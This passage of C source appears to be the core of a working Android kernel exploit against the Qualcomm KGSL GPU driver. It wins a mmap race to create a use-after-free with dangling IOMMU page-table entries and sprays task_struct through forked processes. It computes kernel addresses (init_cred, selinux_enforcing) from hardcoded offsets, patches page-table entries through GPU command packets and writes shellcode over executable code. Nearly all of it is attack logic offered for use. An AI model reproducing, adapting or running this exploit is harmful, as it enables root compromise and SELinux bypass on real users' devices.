    fprintf(stderr, "[1] UAF GPUOBJ_ALLOC\n");
    struct kgsl_gpuobj_alloc uaf_alloc = {0};
    uaf_alloc.size = UAF_SIZE;
    uaf_alloc.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
    uaf_alloc.va_len = 0;
    
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &uaf_alloc) < 0) {
        fprintf(stderr, "[!] UAF alloc failed: %s\n", strerror(errno));
        return 1;
    }
    uaf_id = uaf_alloc.id;
    uaf_mmapsize = uaf_alloc.mmapsize;
    fprintf(stderr, "    UAF id=%u mmapsize=0x%llx\n", uaf_id,
            (unsigned long long)uaf_mmapsize);
    
    fprintf(stderr, "\n[2] OVERLAP GPUOBJ_ALLOC (no mmap yet)\n");
    struct kgsl_gpuobj_alloc overlap_alloc = {0};
    overlap_alloc.size = OVERLAP_SIZE;
    overlap_alloc.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
    overlap_alloc.va_len = 0;
    
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &overlap_alloc) < 0) {
        fprintf(stderr, "[!] OVERLAP alloc failed: %s\n", strerror(errno));
        return 1;
    }
    overlap_id = overlap_alloc.id;
    overlap_mmapsize = overlap_alloc.mmapsize;
    fprintf(stderr, "    OVERLAP id=%u mmapsize=0x%llx\n", overlap_id,
            (unsigned long long)overlap_mmapsize);
    
    fprintf(stderr, "\n[3] UAF mmap() at FIXED 0x%llx\n",
            (unsigned long long)UAF_START);
    uaf_vma = mmap_gpuobj_fixed(fd, uaf_id, uaf_mmapsize, (void *)(uintptr_t)UAF_START);
    if (uaf_vma == MAP_FAILED || (uint64_t)uaf_vma != UAF_START) {
        fprintf(stderr, "[!] UAF mmap failed: %s\n", strerror(errno));
        return 1;
    }
    fprintf(stderr, "    UAF mapped at %p (expected 0x%llx)\n", 
            uaf_vma, (unsigned long long)UAF_START);
    
    // Touch pages
    for (size_t i = 0; i < uaf_mmapsize; i += PAGE_SIZE) {
        ((volatile char *)uaf_vma)[i] = 1;
    }
    fprintf(stderr, "    Touched %llu pages\n", 
            (unsigned long long)(uaf_mmapsize / PAGE_SIZE));
    
    fprintf(stderr, "\n[4] UAF munmap()\n");
    fprintf(stderr, "    Note: rbtree entry and IOMMU PTEs remain\n");
    munmap(uaf_vma, uaf_mmapsize);
    uaf_vma = NULL;
    usleep(200);
    
    fprintf(stderr, "\n[5] Anonymous mmap at 0x%llx (3 pages)\n",
            (unsigned long long)BOGUS_START);
    bogus_vma = mmap((void *)(uintptr_t)BOGUS_START, PAGE_SIZE * 3,
                     PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED,
                     -1, 0);
    if (bogus_vma == MAP_FAILED || (uint64_t)bogus_vma != BOGUS_START) {
        fprintf(stderr, "[!] BOGUS mmap failed: %s\n", strerror(errno));
        return 1;
    }
    for (int i = 0; i < 3; i++) {
        ((volatile char *)bogus_vma)[i * PAGE_SIZE] = 1;
    }
    fprintf(stderr, "    BOGUS VMA at %p\n", bogus_vma);
    
    fprintf(stderr, "\n[6] PLACEHOLDER GPUOBJ_ALLOC\n");
    struct kgsl_gpuobj_alloc ph_alloc = {0};
    ph_alloc.size = PLACEH_SIZE;
    ph_alloc.flags = KGSL_MEMFLAGS_USE_CPU_MAP;
    ph_alloc.va_len = 0;
    
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ph_alloc) < 0) {
        fprintf(stderr, "[!] PLACEHOLDER alloc failed: %s\n", strerror(errno));
        return 1;
    }
    ph_id = ph_alloc.id;
    ph_mmapsize = ph_alloc.mmapsize;
    fprintf(stderr, "    PLACEHOLDER id=%u mmapsize=0x%llx\n", ph_id,
            (unsigned long long)ph_mmapsize);
    
    fprintf(stderr, "\n[7] PLACEHOLDER mmap() at FIXED 0x%llx\n",
            (unsigned long long)PLACEH_START);
    ph_vma = mmap_gpuobj_fixed(fd, ph_id, ph_mmapsize, (void *)(uintptr_t)PLACEH_START);
    if (ph_vma == MAP_FAILED || (uint64_t)ph_vma != PLACEH_START) {
        fprintf(stderr, "[!] PLACEHOLDER mmap failed: %s\n", strerror(errno));
        return 1;
    }
    fprintf(stderr, "    PLACEHOLDER mapped at %p (expected 0x%llx)\n", 
            ph_vma, (unsigned long long)PLACEH_START);
    
    // Touch pages
    for (size_t i = 0; i < ph_mmapsize; i += (PAGE_SIZE * 1024)) {
        ((volatile char *)ph_vma)[i] = 1;
    }
    

    
    int mmap_errno = 0;
    
    
    fprintf(stderr, "[8] Main thread will mmap OVERLAP\n\n");
    
    race_state_t rs = {
        .fd = fd,
        .ready = 0,
        .bogus_started = 0,
        .result = -1,
        .saved_errno = 0
    };
    
    pthread_t bogus_thread;
    pthread_create(&bogus_thread, NULL, bogus_racer, &rs);
    
    rs.ready = 1;
    __sync_synchronize();
    
    // wait for thread
    int timeout = 0;
    while (!rs.bogus_started && timeout < 1000) {
        __asm__ __volatile__("" ::: "memory");
        timeout++;
    }
    
    // Race window delay 
    usleep(200);
    
    fprintf(stderr, "[9] OVERLAP mmap() at FIXED 0x%llx during race\n",
            (unsigned long long)OVERLAP_START);
    
    // Try race
    overlap_vma = mmap_gpuobj_fixed(fd, overlap_id, overlap_mmapsize, (void *)(uintptr_t)OVERLAP_START);
    mmap_errno = errno;
    
    pthread_join(bogus_thread, NULL);
    
    fprintf(stderr, "    OVERLAP mmap result: %s\n",
            overlap_vma == MAP_FAILED ? "FAILED" : "SUCCESS");
    
    if (overlap_vma == MAP_FAILED) {
        fprintf(stderr, "      errno=%d (%s)\n", mmap_errno, strerror(mmap_errno));
    } else {
        fprintf(stderr, "      mapped at %p (expected 0x%llx)\n",
                overlap_vma, (unsigned long long)OVERLAP_START);
    }
    
    if (overlap_vma == MAP_FAILED && mmap_errno == 19) {  // ENODEV
        fprintf(stderr, "\n[!] RACE CONDITION WON!\n");
        success = 1;
    }


    if (!success) {
        fprintf(stderr, "[-] Race failed (errno=%d), retrying...\n", mmap_errno);

        if (overlap_vma != MAP_FAILED && overlap_vma != NULL) {
            munmap(overlap_vma, overlap_mmapsize);
        }
        
        if (ph_vma != MAP_FAILED && ph_vma != NULL) {
            munmap(ph_vma, ph_mmapsize);
        }
        
        if (bogus_vma != MAP_FAILED && bogus_vma != NULL) {
            munmap(bogus_vma, PAGE_SIZE * 3);
        }


        struct kgsl_gpuobj_free free_obj;
        free_obj.flags = 0; 

        if (overlap_id) {
            free_obj.id = overlap_id;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
        }
        if (ph_id) {
            free_obj.id = ph_id;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
        }
        if (uaf_id) {
            free_obj.id = uaf_id;
            ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
        }


        if (fd >= 0) {
            close(fd);
            fd = -1;
        }

        retries--;
        if (retries > 0) {
            fprintf(stderr, "[-] Retrying exploit... (%d attempts left)\n", retries);
            sleep(1);
            goto restart; 
        } else {
            fprintf(stderr, "[!] All retries failed. Giving up.\n");
            return 1;
        }
    }

    
    fprintf(stderr, "[10] Freeing UAF to create dangling PTEs\n");
    struct kgsl_gpuobj_free uaf_free = {0};
    uaf_free.id = uaf_id;
    if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &uaf_free) == 0) {
        fprintf(stderr, "    UAF freed (id=%u)\n", uaf_id);
        uaf_id = 0;
    }

        fprintf(stderr, "\n[11] Spraying task_struct\n");
        
        char qwerqwer[0x500] = {0};
        pid_t spray_pids[SPRAY_COUNT_MAX];
        fd2 = open("/data/local/tmp/memo", O_RDWR | O_CREAT | O_TRUNC, 0644);
        write(fd2,qwerqwer,0x500);
        int spray_success = 0;
        int fd_zero = -1;
        fd_zero = open("/data/local/tmp/zeros.bin", O_RDWR | O_CREAT | O_TRUNC, 0644);
        
        char buffer_zero[0x100];
        memset(buffer_zero, 0, sizeof(buffer_zero)); 
        write(fd_zero, buffer_zero, sizeof(buffer_zero));
        lseek(fd_zero,0,SEEK_SET);
        for (int i = 0; i < spray_count; i++) {
            pid_t pid = fork();

            if (pid == 0) {
                struct kgsl_gpuobj_free free_obj = {0};

                close(fd);

                // set task name
                char proc_name[16];  // TASK_COMM_LEN
                memset(proc_name,0,16);
                pid_t self = getpid();
                snprintf(proc_name, sizeof(proc_name), "%s%05d", MARKER_NAME, self);
                prctl(PR_SET_NAME, proc_name, 0, 0, 0);
                int idx = i;
                spray_ctrl[idx].pid=self;
                spray_ctrl[idx].do_action=0;
                while(1){
                    if(spray_ctrl[idx].do_action==1 && gbuf[0]==0xab){
                        while(1){
                            if (*(uint64_t *)&gbuf[SET_TASKS] != 0) break;
                        }
                        uint64_t rrtt=read(fd_zero,(void *)*(uint64_t *)&gbuf[SET_TASKS],4);
                        if (rrtt<0){
                            gbuf[TASK_SPRAY_CLEAR]=0x1;
                        }
                        else if(rrtt>0) {
                            gbuf[TASK_SPRAY_CLEAR]=0x2;
                        }
                        else if (rrtt==0){
                            gbuf[TASK_SPRAY_CLEAR]=0x3;
                        }
                        while(1){
                            return 0;
                        }
                        return 0;
                        
                    }
                    sleep(1);
                }
            }
                

            else if (pid > 0){
                spray_success++;
            }
            else{
                spray_pids[i]=-1;
            }
            //usleep(10);
        }

        fprintf(stderr, "    [+] Sprayed %d processes with names: %s0000 ~ %s%04d\n",
                spray_success, MARKER_NAME, MARKER_NAME, spray_success - 1);
        
        usleep(20);
        
        fprintf(stderr, "\n[12] Scanning UAF region for non-zero data\n");
        struct nonzero_page found_pages[FINDING];
        int num_found = 0;
        uint64_t found_va = 0;
        int found_count = 0;

        if (scan_uaf_for_nonzero_multi(fd, found_pages, &num_found)) {
            fprintf(stderr, "\n");
            fprintf(stderr, " NON-ZERO PAGES FOUND IN UAF REGION!\n");
            fprintf(stderr, "Count: %d pages\n", num_found);

        } else {
            fprintf(stderr,
                    "\n    [!] scan_uaf_for_nonzero_multi failed (only_once != 1). Cleaning up and restarting...\n");

            for (int i = 0; i < spray_count; i++) {
                if (spray_ctrl[i].pid > 0) {
                    kill(spray_ctrl[i].pid, SIGTERM);
                }
            }
            for (int i = 0; i < spray_count; i++) {
                if (spray_ctrl[i].pid > 0) {
                    waitpid(spray_ctrl[i].pid, NULL, 0);
                }
            }

            if (fd_zero >= 0) {
                close(fd_zero);
                fd_zero = -1;
            }
            if (fd2 >= 0) {
                close(fd2);
                fd2 = -1;
            }

            if (overlap_vma && overlap_vma != MAP_FAILED) {
                munmap(overlap_vma, overlap_mmapsize);
                overlap_vma = NULL;
            }
            if (ph_vma && ph_vma != MAP_FAILED) {
                munmap(ph_vma, ph_mmapsize);
                ph_vma = NULL;
            }
            if (bogus_vma && bogus_vma != MAP_FAILED) {
                munmap(bogus_vma, PAGE_SIZE * 3);
                bogus_vma = NULL;
            }

            struct kgsl_gpuobj_free free_obj = {0};
            if (overlap_id) {
                free_obj.id = overlap_id;
                ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
                overlap_id = 0;
            }
            if (ph_id) {
                free_obj.id = ph_id;
                ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
                ph_id = 0;
            }
            if (uaf_id) {
                free_obj.id = uaf_id;
                ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_obj);
                uaf_id = 0;
            }

            if (fd >= 0) {
                close(fd);
                fd = -1;
            }

            memset(spray_ctrl, 0, sizeof(spray_slot_t) * SPRAY_COUNT_MAX);
            if (spray_count + SPRAY_COUNT_STEP <= SPRAY_COUNT_MAX) {
                spray_count += SPRAY_COUNT_STEP;
            } else {
                spray_count = SPRAY_COUNT_MAX;
            }
            goto restart;
        }
        
    for (int i = 0; i < spray_count; i++) {
        if(spray_ctrl[i].do_action==0){
            kill(spray_ctrl[i].pid,SIGTERM);
        }
    }
    for (int i = 0; i < spray_count; i++) {
        if(spray_ctrl[i].do_action==0){
            waitpid(spray_ctrl[i].pid,NULL,0);
        }
    }
    


    uint64_t kbase = (*(uint64_t *)&gbuf[0x20]);
    uint64_t init_cred = kbase + 0x24D90D0;
    uint64_t poweroff_cmd = kbase+0x2BB8EC0;
    uint64_t orderly_poweroff = kbase + 0x5F96C;
    uint64_t memstart_addr = kbase + 0x24C2538;
    selinux_enforcing = kbase+0x2F74CE8;
    *(uint64_t *)&gbuf[SET_TASKS]=selinux_enforcing;
    sleep(1);
    fprintf(stderr, "child start %lx\n", *(uint64_t *)&gbuf[SET_TASKS]);
    gbuf[0] = 0xab;
    while(1){
        if(gbuf[TASK_SPRAY_CLEAR]==0x1){
            fprintf(stderr,"child read fail\n");
            break;
        }
        else if (gbuf[TASK_SPRAY_CLEAR]==0x2){
            fprintf(stderr,"child read success\n");
            break;
        }
        else if (gbuf[TASK_SPRAY_CLEAR]==0x3){
            fprintf(stderr, "ret is 0\n");
            break;
        }
    }
    
    mmap_spray();
    struct nonzero_page pages2[MAX_FOUND_PAGES];
    int num_pages2 = 0;
    if (scan_uaf_and_collect(fd, pages2, &num_pages2)){
    }
    else{
        fprintf(stderr, "[!] No pages found in UAF region\n");
    }
    gbuf[0x910]=1;
    mmap_check();
    sleep(1); // for context switching
    fprintf(stderr,"mmap_check complete.\n");
    uint32_t rb_count = *(uint32_t *)(gbuf+0xb00);
    struct kgsl_drawctxt_create ctx2 = {
            .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC
        };
    if (ioctl(fd,IOCTL_KGSL_DRAWCTXT_CREATE, &ctx2) == 0){
        unsigned ctx_id2 = ctx2.drawctxt_id;
        struct kgsl_gpuobj_alloc ib_alloc = {
            .size = PAGE_SIZE *4,
            .flags = KGSL_MEMFLAGS_USE_CPU_MAP
        };
        if(ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc)==0){
            unsigned ib_id2 = ib_alloc.id;
            void * ib_vma2 = mmap(NULL,ib_alloc.mmapsize, PROT_READ | PROT_WRITE , MAP_SHARED ,fd,((off_t)ib_id2) <<12);
            if (ib_vma2 != MAP_FAILED){
                struct kgsl_gpuobj_info info ={ .id=ib_id2 };
                ioctl(fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
                uint64_t ib_gpu2  = info.gpuaddr;

                struct kgsl_gpuobj_alloc dump_alloc ={
                    .size = PAGE_SIZE*2,
                    .flags = KGSL_MEMFLAGS_USE_CPU_MAP
                };
                unsigned dump_id = 0;
                void * dump_vma = NULL;
                uint64_t dump_gpu = 0;
                if(ioctl(fd,IOCTL_KGSL_GPUOBJ_ALLOC,&dump_alloc)==0){
                    dump_id = dump_alloc.id;
                    dump_vma = mmap(NULL, dump_alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ((off_t)dump_id)<<12);
                    if (dump_vma != MAP_FAILED){
                        struct kgsl_gpuobj_info dump_info = {.id=dump_id};
                        ioctl(fd,IOCTL_KGSL_GPUOBJ_INFO,&dump_info);
                        dump_gpu = dump_info.gpuaddr;
                        
                    }
                    else{
                        dump_vma=NULL;
                    }
                }
                else{
                    fprintf(stderr,"dump_alloc");
                }

                fprintf(stderr, "rb_count: %u\n", rb_count);
                for(uint32_t ri = 0; ri < rb_count; ri++){
                    uint64_t va = *(uint64_t *)(gbuf + 0xb08 + ri * 24);
                    fprintf(stderr, "VA : %llx\n", (unsigned long long)va);
                    uint32_t *cmd = (uint32_t *)ib_vma2;
                    int dw = 0;
                    uint32_t d_lo, d_hi, s_lo, s_hi;
                    fprintf(stderr,"check1\n");
                    memset(ib_vma2,0,ib_alloc.mmapsize);
                    cmd[dw++] = cp_type7_packet(CP_NOP,0);
                    if (dump_vma){
                        fprintf(stderr, "dump_vma %p\n", dump_vma);
                        for(int i_dump = 0; i_dump < 0x80; i_dump++){
                            split64(dump_gpu + (uint64_t)i_dump * 4, &d_lo, &d_hi);
                            split64(va + (uint64_t)i_dump * 4, &s_lo, &s_hi);
                            cmd[dw++] =cp_type7_packet(CP_MEM_TO_MEM,5);
                            cmd[dw++] = 0;
                            cmd[dw++] = d_lo;
                            cmd[dw++] = d_hi;
                            cmd[dw++] = s_lo;
                            cmd[dw++] = s_hi;
                        }
                    }
                    else{
                        fprintf(stderr,"WWDDWFWEFE");
                    }
                    cmd[dw++] = cp_type7_packet(CP_NOP,0);

                    size_t bytes = (size_t)dw * 4;
                    msync(ib_vma2, bytes, MS_SYNC);
                    struct kgsl_command_object obj = {
                        .gpuaddr=ib_gpu2,
                        .size = bytes,
                        .flags = KGSL_CMDLIST_IB,
                        .id = ib_id2
                    };

                    struct kgsl_gpu_command c = {0};
                    c.cmdlist = (uint64_t)(uintptr_t)&obj;
                    c.cmdsize = sizeof(obj);
                    c.numcmds = 1;
                    c.context_id = ctx_id2;

                    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND,&c) != 0 || wait_timestamp(fd, ctx_id2, c.timestamp) != 0 ){
                        fprintf(stderr,
                                "       [!] GPU copy failed (read) for VA 0x%llx\n",
                                (unsigned long long)va);
                        continue;
                    }

                    if(!dump_vma) continue;
                    msync(dump_vma, 0x200, MS_SYNC | MS_INVALIDATE);
                    write(fd2,dump_vma,0x200);
                    write(fd2,"aaaaaaaaaaaaaaa",0x10);
                    uint64_t orig =  *(uint64_t *)((uint8_t *)dump_vma + 8*sig_num[0]);
                    uint64_t pte1 = *(uint64_t *)((uint8_t *)dump_vma + 8*sig_num[1]);
                    uint64_t src = *(uint64_t *)((uint8_t *)dump_vma + 0x130);

                    const uint64_t PFN_MASK = PHYS_MASK & PAGE_MASK;
                    uint64_t orig_pfn = orig & PFN_MASK;
                    uint64_t pte1_pfn = pte1 & PFN_MASK;
                    uint64_t src_pfn = src & PFN_MASK;

                    if (src_pfn == 0){
                        fprintf(stderr,
                                "       [!] Skip patch: src PFN at 0x130 is empty VA : 0x%llx\n",
                                (unsigned long long)va);
                        continue;
                    }
                    uint64_t new_pte = (orig & ~PFN_MASK) | src_pfn;
                    uint64_t copied_pfn = src_pfn;
                    memset(ib_vma2, 0 , ib_alloc.mmapsize);
                    dw = 0;
                    cmd = (uint32_t *)ib_vma2;

                    for (int i=0; i<4; i++){
                        cmd[dw++] = cp_type7_packet(CP_NOP,0);
                    }
                    split64(va+ (uint64_t)sig_num[0]*8 ,&d_lo,&d_hi);
                    cmd[dw++] = cp_type7_packet(CP_MEM_WRITE,3);
                    cmd[dw++] = d_lo;

                    cmd[dw++] = d_hi;
                    cmd[dw++] = (uint32_t) (new_pte & 0xffffffffu);

                    split64(va+4+(uint64_t)sig_num[0]*8 , &d_lo, &d_hi);
                    cmd[dw++] = cp_type7_packet(CP_MEM_WRITE,3);
                    cmd[dw++] = d_lo;
                    cmd[dw++] = d_hi;
                    cmd[dw++] = (uint32_t)(new_pte >>32);
                    for(int i=0;i<4;i++){
                        cmd[dw++] = cp_type7_packet(CP_NOP,0);
                    }
                    bytes = (size_t)dw * 4;
                    msync(ib_vma2, bytes , MS_SYNC);
                    obj.size = bytes;
                    memset(&c,0,sizeof(c));
                    c.cmdlist = (uint64_t)(uintptr_t)&obj;
                    c.cmdsize = sizeof(obj);
                    c.numcmds = 1;
                    c.context_id = ctx_id2;

                    if(ioctl(fd,IOCTL_KGSL_GPU_COMMAND, &c)==0 && wait_timestamp(fd,ctx_id2,c.timestamp) == 0 ) {
                        fprintf(stderr,"        [*] Patched PTE PFN From 0x130 -> 0x0 for VA 0x%llx (orig PFN 0x%llx, pte1 PFN 0x%llx, src PFN 0x%llx copied PFN bits 0x%llx)\n",
                            (unsigned long long)va,
                            (unsigned long long)orig_pfn,
                            (unsigned long long)pte1_pfn,
                            (unsigned long long)src_pfn,
                            (unsigned long long)copied_pfn);

                    } 
                    else {
                        fprintf(stderr,
                                "        [!] GPU patch (write stage) failed for VA 0x%llx\n",
                                (unsigned long long)va);
                    }
                    memset(ib_vma2,0,ib_alloc.mmapsize);
                    dw = 0;
                    cmd = (uint32_t * )ib_vma2;
                    cmd[dw++] = cp_type7_packet(CP_NOP,0);
                    for (int i_dump = 0; i_dump < 0x80; i_dump++){
                        split64(dump_gpu +(uint64_t)i_dump *4, &d_lo, &d_hi);
                        split64(va+(uint64_t)i_dump *4, &s_lo, &s_hi);
                        cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM,5);
                        cmd[dw++] = 0;
                        cmd[dw++]= d_lo;
                        cmd[dw++] = d_hi;
                        cmd[dw++] = s_lo;
                        cmd[dw++] = s_hi;
                        
                    }
                    cmd[dw++] = cp_type7_packet(CP_NOP,0);
                    bytes = (size_t) dw * 4;
                    msync(ib_vma2, bytes, MS_SYNC);
                    
                    obj.size = bytes;
                    memset(&c, 0 ,sizeof(c));
                    c.cmdlist = (uint64_t) (uintptr_t) & obj;
                    c.cmdsize = sizeof(obj);
                    c.numcmds = 1;
                    c.context_id = ctx_id2;

                    if (ioctl(fd, IOCTL_KGSL_GPU_COMMAND, &c) ==0 && wait_timestamp(fd,ctx_id2, c.timestamp)==0){
                        msync(dump_vma, 0x200, MS_SYNC | MS_INVALIDATE);
                        write(fd2,dump_vma,0x200);
                    }
                    fprintf(stderr, "everything over\n");
                    uint64_t orig_pte_slot = *(uint64_t *)(gbuf + 0xb10 + ri * 24);
                    uint64_t pte1_slot = *(uint64_t *)(gbuf + 0xb18 + ri * 24);
                    fprintf(stderr,
                            "orig pte 0x%llx, pte1 0x%llx ",
                            (unsigned long long)orig_pte_slot,
                            (unsigned long long)pte1_slot);




                }
                
                if (dump_vma) {
                    munmap(dump_vma, dump_alloc.mmapsize);

                }
                if(dump_id){
                    struct kgsl_gpuobj_free fr_dump = {0};
                    fr_dump.id = dump_id;
                    ioctl(fd,IOCTL_KGSL_GPUOBJ_FREE,&fr_dump);
                }
                munmap(ib_vma2,ib_alloc.mmapsize);
                
            }
            else{
                fprintf(stderr,"alloc vma2");
            }
            
            struct kgsl_gpuobj_free fr = {0};
            fr.id = ib_id2;
            ioctl(fd,IOCTL_KGSL_GPUOBJ_FREE,&fr);
            
        }
        else{
            fprintf(stderr,"ibALLOC\n");
        }
        
    }
    else{
        fprintf(stderr,"IOCTL_KGSL_DRAWCTXT_CREATE");
    }
    
    fprintf(stderr, "done!@#!@#\n");
    write(fd2,(void *)(gb_target_addr+0x1000),0x1000);

    fprintf(stderr, "exploit start!\n");
    waitpid(*(uint64_t *)&gbuf[TARGET_PIDPID],NULL, 0);
    int still = 0;
    for (int i = 0; i < spray_count; i++) {
        pid_t p = spray_ctrl[i].pid;
        if (p <= 0) continue;
        if (kill(p, 0) == 0) {
            still++;
            fprintf(stderr, "[!] pid still exists=%d\n", p);
        }
    }
    fprintf(stderr, "[*] spray exists count=%d\n", still);

    int nice_idx=-1;
    int fd_recover = open("/data/local/tmp/recover",O_RDWR | O_CREAT | O_TRUNC,0777);
    write(fd_recover,(void *)(*(uint64_t *)&gbuf[0x400]+0x162d4),287);
    lseek(fd_recover,0,SEEK_SET);
    uint64_t first= *(uint64_t *)(gb_target_addr+PAGE_SIZE + 0x2d4);


    fprintf(stderr, "first 8 : %lx\n",first);
    fprintf(stderr,"protect success\n");
    
    
    if (first==0xd102c3ffd503233f){
        lseek(fd_shellcode,0,SEEK_SET);
        
        if (read(fd_shellcode,(void *)(gb_target_addr+PAGE_SIZE + 0x2d4),287)<=0){
            fprintf(stderr,"read not success\n");
            perror("read");
        }
        //flush_icache((void *)(gb_target_addr+PAGE_SIZE+0x2d4),(size_t)287);
        fprintf(stderr,"read success\n");
        fprintf(stderr, "second 8 : %lx\n",*(uint64_t *)(gb_target_addr+PAGE_SIZE + 0x2d4));
    }
    if (first==0xd102c3ffd503233f){
        fprintf(stderr,"nice job\n");
    }        


    
    
    gbuf[FOUND_PID]=0x11;
    waitpid(pid, NULL, 0); 
    
    
    while(1){

        

        if (gbuf[CALL_LOGLINE]==0x11){
            fprintf(stderr,"[+] TRIGGERED! Holding init...\n");
            
            break;
        }
        usleep(500);
    }

    usleep(500000);

    ssize_t recover_len = read(fd_recover,(void *)(gb_target_addr+PAGE_SIZE+0x2d4),287);
    //flush_icache((void *)(gb_target_addr+PAGE_SIZE+0x2d4),(size_t)recover_len);
    recover_origin(fd);

    
    sleep(1);
    struct kgsl_gpuobj_free free_req = {0};


    if (ph_id) {
        free_req.id = ph_id;
        if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_req) < 0) {
            perror("cleanup: free ph_id"); 
        } else {
            fprintf(stderr, "    [+] Freed Placeholder ID %u\n", ph_id);
        }
        ph_id = 0;
    }
    

    if (overlap_id) {
        free_req.id = overlap_id;
        if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_req) < 0) {
            perror("cleanup: free overlap_id");
        } else {
            fprintf(stderr, "    [+] Freed Overlap ID %u\n", overlap_id);
        }
        overlap_id = 0;
    }
    
    if (uaf_id) {
        free_req.id = uaf_id;
        if (ioctl(fd, IOCTL_KGSL_GPUOBJ_FREE, &free_req) < 0) {
            perror("cleanup: free uaf_id");
        } else {
            fprintf(stderr, "    [+] Freed UAF ID %u\n", uaf_id);
        }
        uaf_id = 0;
    }
    


    if (overlap_vma && overlap_vma != MAP_FAILED) {
        munmap(overlap_vma, overlap_mmapsize);
    }
    if (ph_vma && ph_vma != MAP_FAILED) {
        munmap(ph_vma, ph_mmapsize);
    }
    if (bogus_vma && bogus_vma != MAP_FAILED) {
        munmap(bogus_vma, PAGE_SIZE * 3);
    }
    close(fd_zero);
    close(fd2);
    close(fd_lib);
    close(fd_shellcode);
    close(fd);
    usleep(100);
    mmap_spray_free();
    return 0;

}
